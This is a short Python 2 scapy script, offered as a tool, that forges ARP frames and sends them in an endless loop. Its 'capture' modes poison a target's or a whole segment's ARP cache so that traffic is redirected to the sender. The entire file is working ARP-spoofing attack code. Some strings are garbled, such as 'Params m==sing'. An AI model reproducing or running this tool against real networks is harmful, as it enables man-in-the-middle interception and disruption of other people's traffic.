#!/usr/bin/python
#coding:utf-8
#date: 2018-05-04
#author:demo
#version:v2.0

import sys
import time
from scapy.all import *
from optparse import OptionParser

usage = "%prog -i <interface> -T <target-IP> <smoof-IP>"
parser = OptionParser(usage = usage)

helpMode =  "-m pu [protect unicast] -t <target> -i <interface> <attackIP>\n"
helpMode += "-m pb [protect broadcast] -i <interface> <attackIP>            "
helpMode += "-m cu [capture unicast] -t <target> <smoofIP>                  "
helpMode += "-m cb [capture broadcast] <smoofIP>                            "

parser.add_option("-t", type="string", dest="target", help="target IP");
parser.add_option("-i", type="string", dest="interface", help="interface");
parser.add_option("-m", type="string", dest="mode", help=helpMode);

(options, args) = parser.parse_args()

print options.mode == "pu"


try:
    if options.mode == "pu":
        targetIP = options.target
        attackIP = args[0]
        interface = options.interface

    elif options.mode == "pb":
        attackIP = args[0]
        interface = options.interface

# =====================================

    elif options.mode == "cb":
        smoofIP = args[0]

    elif options.mode == "cu":
        targetIP = options.target
        smoofIP = args[0]
    
    else:
        print "Params m==sing"
        sys.exit(2)

except Exception, e:
    print "Params m==sing"
    print e
    sys.exit(2)
    


if options.mode == "pu":
    atkMAC = getmacbyip(attackIP)
    ptcADR = get_if_addr(interface)
    tgtMAC = getmacbyip(targetIP)
    arp = Ether(src=atkMAC, dst=tgtMAC) / ARP(psrc=ptcADR, hwsrc=atkMAC, pdst=targetIP, hwdst=tgtMAC)


elif options.mode == "pb":
    atkMAC = getmacbyip(attackIP)
    ptcADR = get_if_addr(interface)
    arp = Ether(src=atkMAC, dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=ptcADR, hwsrc=atkMAC )


elif options.mode == "cu":
    tgtMAC = getmacbyip(targetIP)
    arp = Ether(dst=tgtMAC) / ARP(psrc=smoofIP, pdst=targetIP, hwdst=tgtMAC)


elif options.mode == "cb":
    arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=smoofIP )




arp.show()

while True:
    time.sleep(1)
    sendp(arp)
